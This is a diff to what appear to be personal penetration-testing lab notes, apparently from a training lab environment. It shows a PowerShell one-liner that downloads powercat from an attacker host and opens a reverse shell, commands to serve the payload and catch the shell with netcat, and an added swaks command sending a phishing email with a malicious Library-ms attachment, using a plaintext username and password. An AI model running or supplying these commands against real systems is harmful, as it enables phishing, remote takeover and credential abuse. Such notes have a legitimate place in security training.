@@ -299,10 +299,14 @@ mkdir /home/kali/beyond/webdav
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"
 
 #on kali
+#host powercat for the phishing victim to download and return with reverse shell
 cp /usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1 .
 python3 -m http.server 8000
 # then start netcat listener after running python3 web server
 nc -nvlp 4444
+
+#Send phishing email. body.txt is the email body using valid credentials from enumeration Username: john, Password: dqsTwTpZPn#nL
+kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
 # Window Priv Esc
